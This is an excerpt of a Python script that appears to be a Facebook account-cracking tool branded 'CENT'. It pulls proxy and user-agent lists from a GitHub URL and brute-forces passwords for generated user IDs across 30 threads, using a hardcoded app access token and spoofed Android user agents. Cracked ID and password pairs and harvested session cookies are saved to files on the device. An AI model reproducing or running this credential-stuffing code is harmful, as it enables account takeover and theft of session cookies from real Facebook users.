...
try:
	prox= requests.get('https://raw.githubusercontent.com/CenTsuPH/centsu/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/CenTsuPH/centsu/main/proxies.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/CenTsuPH/centsu/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
\033[1;37m--------------------------------------------------
 ...
 [\033[1;32m*\033[1;37m] FB BYPASS  : Active
\033[1;37m--------------------------------------------------
...
def menu():
			...
			if xd in ['1','01']:
				...
				linex()
				print(' [1] METHOD (BEST)')
				print(' [2] METHOD (WITH-PUKI-COOKIE)')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as CENT:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					CENT.submit(CENT4,ids,passlist)
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [CENT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					open('/sdcard/CENT-OK.txt', 'a').write(ids+' | '+pas+' | '+coki+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [CENT-OK/CP] '+ids+' | '+pas+'\033[1;97m')
						os.system('espeak -a 300 " HEY, shit, You, GOT, FIFTHY,FIFTHY, account"')
						open('/sdcard/CENT-OK/CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/CENT-OK/CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [CENT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua ='Dalvik/2.1.0 (Linux; U; Android 12; Build/LIB9BX) [FBAN/FB4A;FBAV/169.0.0.32237;FBBV/667583638;FBRV/0;FBPN/com.facebook.katana;FBLC/es_ES;FBMF/;FBBD/;FBDV/;FBSV/12;FBCA/armeabi-v7a:armeabi;,Dalvik/2.1.0 (Linux; U; Android 9; Build/TP1A.907904.237) [FBAN/FB4A;FBAV/426.0.0.9488;FBBV/694517902;FBRV/0;FBPN/com.facebook.mlite;FBLC/sl_SI;FBMF/;FBBD/;FBDV/;FBSV/9;FBCA/armeabi-v7a:armeabi;,Dalvik/2.1.0 (Linux; U; Android 8; Build/LWHNNF) [FBAN/FB4A;FBAV/296.0.0.11175;FBBV/43185726;FBRV/0;FBPN/com.facebook.mlite;FBLC/fr_FR;FBMF/;FBBD/;FBDV/;FBSV/8;FBCA/armeabi-v7a:armeabi;,Dalvik/2.1.0 (Linux; U; Android 9; Build/L6H95E) [FBAN/FB4A;FBAV/457.0.0.18364;FBBV/99984489;FBRV/0;FBPN/com.facebook.lite;FBLC/ne_NP;FBMF/;FBBD/;FBDV/;FBSV/9;FBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[CENT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
#method4
def CENT4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [CENT-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [CENT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/CENT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/CENT-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
